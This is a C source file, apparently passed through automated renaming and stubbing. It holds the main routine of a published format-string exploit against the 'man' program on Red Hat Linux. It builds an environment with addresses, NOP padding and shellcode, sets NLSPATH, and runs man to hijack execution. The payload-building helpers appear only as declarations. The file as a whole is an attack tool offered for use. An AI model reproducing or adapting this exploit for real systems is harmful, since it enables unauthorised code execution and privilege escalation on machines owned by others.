#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  environ ;

/* Variables and functions */
 int /*<<< orphan*/  PATH ; 
 scalar_t__ FUNC0 (char*) ; 
 int /*<<< orphan*/  FUNC1 (void*,int) ; 
 scalar_t__ FUNC2 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC3 (int) ; 
 scalar_t__ FUNC4 (int) ; 
 int /*<<< orphan*/  FUNC5 (char*) ; 
 int /*<<< orphan*/  FUNC6 (char*,char*) ; 
 char* FUNC7 (scalar_t__) ; 
 char* FUNC8 (scalar_t__) ; 

int FUNC9(int argc,char **argv){
 extern char **environ;

 if(argc<2){
  FUNC6("(*)man[v1.5l]: format string exploit.\n"
  "(*)by: v9@fakehalo.deadpig.org / fakehalo.\n\n"
  "syntax: %s <platform>\n"
  " 0 : Compiled RH/linux 2.4.2-2.\n",argv[0]);
  FUNC3(1);
 }
 if(FUNC0(argv[1])>0)
  FUNC5("main(): invalid platform number");

 /* reset environment to ensure addresses   */
 /* are aligned.  as the pointer used is    */
 /* going to be aligned in the environment. */
 FUNC1((void *)&environ,sizeof(environ));
 if(!(environ=(char **)FUNC4(3*(sizeof(char *)))))
  FUNC5("main(): allocation of memory error");

 /* X<alignment>=<addr+2><addr><nops><shellcode> */
 environ[0]=FUNC7(FUNC0(argv[1]));

 /* NLSPATH=/path/to/lang. */
 environ[1]=FUNC8(FUNC0(argv[1]));
 environ[2]=0x0;

 if(FUNC2(PATH,PATH,0))
  FUNC5("main(): failed to execute man");

 FUNC3(0);
}